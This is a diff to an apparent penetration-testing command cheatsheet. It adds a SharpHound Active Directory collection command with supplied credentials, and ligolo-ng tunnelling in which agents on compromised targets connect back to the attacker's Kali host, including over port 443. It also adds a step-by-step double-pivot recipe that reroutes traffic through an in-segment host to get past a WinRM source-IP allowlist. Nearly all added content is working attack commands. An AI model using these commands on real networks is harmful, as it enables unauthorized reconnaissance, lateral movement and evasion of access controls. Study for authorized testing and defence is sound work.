@@ -403,6 +403,7 @@ $ zip -r mass_bh.zip *.json
 $ sudo neo4j start
 $ bloodhound
 PS C:\> .\SharpHound.exe -c All --zipfilename bloodhound
+PS C:\> .\SharpHound.exe -c All --ldapusername <username> --ldappassword '<password>' --domain <Domain> --zipfilename bloodhound
 https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
 https://github.com/dirkjanm/BloodHound.py
 ```
@@ -1315,9 +1316,13 @@ https://github.com/gunyakit/command-cheatsheet/blob/main/5.Lateral-Movement/5.3.
 # Single Pivot
 # On Kali
 $ ./proxy --selfcert
+OR
+$ ./proxy --selfcert --laddr 0.0.0.0:443
 
 # On Target
 $ ./agent -connect <Kali IP address>:11601 -ignore-cert
+OR
+$ ./agent -connect <Kali IP address>:443 -ignore-cert
 
 # On Kali
 ligolo-ng » session
@@ -1339,6 +1344,34 @@ Select the new session with arrow keys and Enter
 ligolo-ng » interface_create --name ligolo2
 ligolo-ng » interface_add_route --name ligolo2 --route <new CIDR range that you want to access>
 ligolo-ng » start --tun ligolo2
+
+# Double Pivot — WinRM / source-ACL variant (do single + double pivot first)
+# Some hosts only accept a service (classic: WinRM 5985) from source IPs inside their own segment. The port shows OPEN when scanned from a host inside that segment, but FILTERED from Kali through your pivot - because ligolo NATs your traffic to the pivot's source, which isn't on the target's allowlist. Fix: route the target subnet through the agent that lives IN that segment, so your traffic sources from that host's trusted in-segment IP.
+# interface_delete removes routing only - the agent/tunnel stays connected.
+
+# Confirm it's a source-ACL (not routing/firewall)
+$ nmap -p 445,5985 <IP address>   # 445 open + 5985 filtered = source-ACL
+
+# On Target (the in-segment host, e.g. has an eth0 in the target subnet)
+$ ./agent -connect <Kali IP address>:11601 -ignore-cert
+
+# On Kali - free the route from the old pivot first (subnet routes via ONE interface only)
+ligolo-ng » session
+Select the OLD pivot session (the one that currently routes the subnet) with arrow keys and Enter
+ligolo-ng » interface_delete --name ligolo2
+
+# On Kali - assign the route to the in-segment agent
+ligolo-ng » session
+Select the new in-segment session with arrow keys and Enter
+ligolo-ng » interface_create --name ligolo3
+ligolo-ng » interface_add_route --name ligolo3 --route <target CIDR range>
+ligolo-ng » start --tun ligolo3
+
+# On Kali - verify the route points at the new interface
+$ ip route get <IP address>   # must show: dev ligolo3
+
+# Test - should flip filtered to open
+$ nmap -Pn -p 5985 <IP address> 
 ```
 
 - Socat
